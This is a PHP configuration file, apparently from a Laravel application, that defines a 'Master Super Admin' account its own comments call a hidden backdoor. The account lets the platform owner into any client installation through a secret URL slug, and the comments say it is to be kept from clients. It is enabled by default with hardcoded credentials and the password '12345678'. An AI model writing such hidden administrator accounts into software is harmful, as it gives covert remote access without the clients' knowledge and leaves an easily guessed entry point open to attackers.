<?php

return [
    /*
    |--------------------------------------------------------------------------
    | Master Super Admin (Hidden)
    |--------------------------------------------------------------------------
    |
    | This is a HIDDEN backdoor for the platform owner to access any client
    | installation remotely for support purposes.
    |
    | Change these values and keep them PRIVATE. Do NOT commit real values
    | to public repos. Do NOT share with clients.
    |
    | To disable this feature entirely, set 'enabled' => false.
    |
    */

    'enabled' => true,

    // The secret login URL slug. Change this to something unique.
    // Final URL: /super/{access_slug}
    'access_slug' => 'secure-master-x9k2',

    // Secret email (any string works — doesn't need to be a real email)
    'email' => 'hidden@gmail.com',

    // Secret password — make this LONG and UNIQUE
    'password' => '12345678',

    // Display name when logged in as master
    'name' => 'Platform Master',
];